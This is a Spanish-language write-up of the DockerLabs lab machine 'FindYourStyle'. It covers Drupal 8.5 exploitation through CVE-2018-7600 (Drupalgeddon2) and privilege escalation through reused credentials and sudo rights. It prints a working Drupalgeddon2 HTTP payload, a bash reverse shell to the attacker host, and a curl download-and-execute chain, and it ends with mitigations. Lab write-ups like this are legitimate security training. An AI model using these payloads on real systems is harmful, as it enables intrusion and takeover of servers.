# FindYourStyle

> **Plataforma:** DockerLabs  
> **Dificultad:** Fácil  
> **Sistema operativo:** Linux  
> **IP objetivo:** 172.17.0.2  

## Resumen

Máquina Linux vulnerable a **CVE-2018-7600 (Drupalgeddon2)**, permitiendo ejecución remota de comandos mediante Drupal AJAX. Posteriormente se realiza una escalada de privilegios mediante credenciales expuestas y permisos sudo mal configurados.

## Cadena de ataque

```text
Drupal 8.5
    ↓
CVE-2018-7600 (Drupalgeddon2)
    ↓
RCE como www-data
    ↓
Credenciales expuestas en settings.php
    ↓
Abuso de permisos sudo
    ↓
   root
```

---

# Reconocimiento

Primero se realiza un reconocimiento de los puertos abiertos y servicios expuestos mediante `nmap`:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts

nmap -p80 -sCV -Pn 172.17.0.2 -oN targeted
```

![[1-Reconocimientonmap.png]]

Los resultados muestran el servicio HTTP expuesto en el puerto `80`. Además, mediante la respuesta del servidor se identifica que está ejecutando un CMS, concretamente **Drupal 8**.

| Puerto | Servicio | Versión | Hallazgo |
|--------|----------|---------|----------|
| 80 | HTTP | Apache 2.4.25 | Drupal 8 |

---

# Enumeración

Ante la identificación de Drupal se realiza una enumeración del servicio web mediante `gobuster`:

```bash
gobuster dir -u http://172.17.0.2/ \
-w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
-t 20 \
-x php,html,txt,bak \
--no-error \
-b 403,404
```

![[2-EnumeracionGobuster.png]]

Posteriormente se inspecciona la aplicación web para identificar la versión exacta de Drupal:

![[3-EnumeracionVersionDrupal.png]]

Una vez obtenida la versión de Drupal se realiza una búsqueda de vulnerabilidades conocidas:

```bash
searchsploit drupal 8.5
```

![[5-EnumeracionExploit.png]]

Se identifica una vulnerabilidad de ejecución remota de comandos asociada a **Drupal 8.5**. Para comprender mejor el funcionamiento de la vulnerabilidad se utiliza una PoC en Python en lugar de Metasploit.

```bash
searchsploit -x php/webapps/44448.py

searchsploit -m php/webapps/44448.py

python3 44448.py
```

![[6-EnumeracionExploitPoC.png]]

![[7-EnumeracionExploitResult.png]]

Se confirma que la aplicación es vulnerable a **CVE-2018-7600 (Drupalgeddon2)**.

## Hallazgos importantes

- Drupal 8.5 vulnerable a CVE-2018-7600.
- Ejecución remota de comandos mediante formularios AJAX.
- PoC disponible para comprobar la vulnerabilidad.

---

# Explotación

Tras identificar la vulnerabilidad **CVE-2018-7600 (Drupalgeddon2)**, se realiza una explotación manual mediante Burp Suite para comprender el funcionamiento del ataque.

La vulnerabilidad permite ejecutar comandos mediante la manipulación del parámetro `#post_render` dentro de los formularios AJAX de Drupal.

Petición modificada:

```http
POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax

form_id=user_register_form
_drupal_ajax=1
mail[#post_render][]=exec
mail[#type]=markup
mail[#markup]=id
```

Como resultado, Drupal ejecuta el comando y devuelve:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![[9-ExplotacionBurpSuitePrueba.png]]

Con esto se confirma la ejecución remota de comandos como el usuario `www-data`.

---

Para obtener una shell interactiva se prepara un archivo con una reverse shell:

```bash
echo "bash -i >& /dev/tcp/172.17.0.1/443 0>&1" > shell.sh

python3 -m http.server 8000
```

En la máquina atacante se inicia la escucha:

```bash
nc -nlvp 443
```

Desde Burp Suite se ejecuta la descarga y ejecución del archivo:

```http
POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1

form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=curl -s http://172.17.0.1:8000/shell.sh -o /tmp/shell.sh | chmod +x /tmp/shell.sh | bash /tmp/shell.sh
```

![[10-ExplotacionBurpSuiteRevShell.png]]

Una vez obtenida la reverse shell se realiza un tratamiento de la TTY:

```bash
script /dev/null -c bash

Ctrl + Z

stty raw -echo; fg

reset

export TERM=xterm
export SHELL=bash

stty rows 39 columns 184
```

![[11-ExplotacionRevShell.png]]

**Vector:** CVE-2018-7600 (Drupalgeddon2) mediante abuso del parámetro `#post_render`.

**Resultado:** acceso obtenido como `www-data`.

---

# Escalada de privilegios

Durante la enumeración local se busca información sensible dentro de la aplicación Drupal.

```bash
find / -name "settings.php" 2>/dev/null

cat ./sites/default/settings.php
```

![[12-PrivescUser.png]]

Dentro del archivo `settings.php` se encuentran credenciales reutilizadas de un usuario del sistema.

Tras acceder con dichas credenciales se realiza una enumeración de permisos sudo:

```bash
sudo -l
```

![[13-PrivescBinarios.png]]

Se observa que el usuario puede ejecutar los binarios `ls` y `grep` con privilegios de administrador.

Mediante el abuso de estos permisos se consigue acceder a información restringida del sistema y obtener la contraseña del usuario root.

![[14-PrivescRoot.png]]

**Vector:** permisos sudo excesivamente permisivos sobre binarios.

**Resultado:** acceso obtenido como `root`.

---

# Cadena final

```text
Drupal 8.5 → CVE-2018-7600 → RCE (www-data) → Credenciales en settings.php → Sudo abuse → root
```

---

# Aprendizajes

- Explotación manual de CVE-2018-7600 mediante Burp Suite.
- Importancia de revisar archivos de configuración de aplicaciones web.
- Las credenciales reutilizadas pueden permitir movimiento dentro del sistema.
- Los permisos sudo mal configurados pueden provocar escaladas de privilegios.

---

# Mitigaciones

- Mantener Drupal actualizado para evitar vulnerabilidades conocidas.
- Evitar almacenar credenciales sensibles dentro de archivos de configuración.
- No reutilizar contraseñas entre servicios.
- Revisar periódicamente los permisos sudo asignados a usuarios.